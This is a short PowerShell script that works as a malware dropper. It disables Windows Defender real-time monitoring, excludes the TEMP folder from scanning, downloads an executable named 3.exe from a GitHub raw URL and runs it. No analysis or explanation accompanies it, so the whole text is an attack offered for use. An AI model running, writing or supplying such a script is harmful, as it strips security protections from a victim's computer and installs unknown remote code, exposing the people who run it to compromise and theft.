$p = "$env:TEMP\3.exe"
Set-MpPreference -DisableRealtimeMonitoring $true -Force
Add-MpPreference -ExclusionPath "$env:TEMP"
iwr 'https://raw.githubusercontent.com/Drenote/123/refs/heads/main/3.exe' -OutFile $p
& $p
